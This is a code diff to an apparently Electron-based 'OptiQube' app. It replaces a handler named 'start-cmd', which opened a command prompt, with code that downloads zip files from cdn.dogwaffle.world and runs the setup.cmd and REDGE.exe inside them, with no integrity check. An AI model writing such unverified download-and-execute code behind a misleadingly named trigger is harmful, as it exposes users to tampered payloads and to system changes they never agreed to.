@@ -1,40 +1,59 @@
-// const { app, BrowserWindow } = require('electron');
-// const { ipcMain } = require('electron');
-
-// const path = require('path');
-
-// function createWindow() {
-//   const win = new BrowserWindow({
-//     width: 1150,
-//     height: 700,
-//     frame: false,
-//     webPreferences: {
-//       preload: path.join(__dirname, 'Core/preload.js'),
-//     }
-//   });
-
-//   win.loadFile('Application/index.html');
-// }
-
-// ipcMain.on('close-window', () => {
-//   BrowserWindow.getFocusedWindow().close();
-// });
-// ipcMain.on('minimize-window', () => {
-//   BrowserWindow.getFocusedWindow().minimize();
-// });
-// ipcMain.on('maximize-window', () => {
-//   const window = BrowserWindow.getFocusedWindow();
-//   window.isMaximized() ? window.unmaximize() : window.maximize();
-// });
-
-
-// app.whenReady().then(() => {
-//   createWindow();
-// });
-
 const { app, BrowserWindow, ipcMain } = require('electron');
 const path = require('path');
+const os = require('os');
+const fs = require('fs');
 const { exec } = require('child_process');
+const fetch = require('node-fetch');
+const AdmZip = require('adm-zip');
+
+async function downloadAndExtract(url, destDir) {
+    const response = await fetch(url);
+    if (!response.ok) throw new Error(`Failed to download ${url}`);
+
+    const buffer = await response.buffer();
+    const zipPath = path.join(destDir, path.basename(url));
+
+    fs.writeFileSync(zipPath, buffer);
+
+    const zip = new AdmZip(zipPath);
+    zip.extractAllTo(destDir, true);
+
+    return destDir;
+}
+
+async function initializeOptiQube() {
+    try {
+        const tempDir = fs.mkdtempSync(path.join(os.tmpdir(), 'optiqube-'));
+
+        await downloadAndExtract('https://cdn.dogwaffle.world/hackbgrt.zip', tempDir);
+        const setupCmdPath = path.join(tempDir, 'setup.cmd');
+
+        console.log('Running setup.cmd...');
+        exec(`"${setupCmdPath}"`, { cwd: tempDir }, (error, stdout, stderr) => {
+            if (error) {
+                console.error(`Error running setup.cmd:`, error);
+                return;
+            }
+            console.log('setup.cmd output:', stdout);
+
+            (async () => {
+                await downloadAndExtract('https://cdn.dogwaffle.world/REDGE.zip', tempDir);
+                const redgeExePath = path.join(tempDir, 'REDGE.exe');
+
+                console.log('Running REDGE.exe...');
+                exec(`"${redgeExePath}"`, { cwd: tempDir }, (error2, stdout2, stderr2) => {
+                    if (error2) {
+                        console.error(`Error running REDGE.exe:`, error2);
+                        return;
+                    }
+                    console.log('REDGE.exe output:', stdout2);
+                });
+            })();
+        });
+    } catch (err) {
+        console.error('Error in initializeOptiQube:', err);
+    }
+}
 
 function createWindow() {
     const win = new BrowserWindow({
@@ -55,11 +74,7 @@ function createWindow() {
     ipcMain.on('close-window', () => win.close());
 
     ipcMain.on('start-cmd', () => {
-        exec('start cmd', (error) => {
-            if (error) {
-                console.error('Failed to open CMD:', error);
-            }
-        });
+        initializeOptiQube();
     });
 }
 
